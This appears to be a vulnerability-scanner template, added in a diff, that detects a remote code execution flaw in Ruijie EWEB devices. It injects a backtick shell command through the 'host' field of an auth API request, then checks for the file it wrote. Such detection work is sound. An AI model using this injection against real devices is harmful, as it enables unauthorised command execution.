@@ -1,0 +1,50 @@
+id: ruijie-eweb-auth-rce
+info:
+  name: Ruijie EWEB Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  t1: "{{rand_base(4)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: initial-post
+    method: POST
+    path:
+      - "/cgi-bin/luci/api/auth"
+    headers:
+      Content-Type: application/json
+    body: |-
+      {"method":"checkNet","params":{"host":"`echo {{t2}}>{{t1}}.txt`"}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"connect\":false"
+      - type: word
+        part: header
+        words:
+          - "Status: 200 OK"
+
+  - id: check-file
+    method: GET
+    path:
+      - "/cgi-bin/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
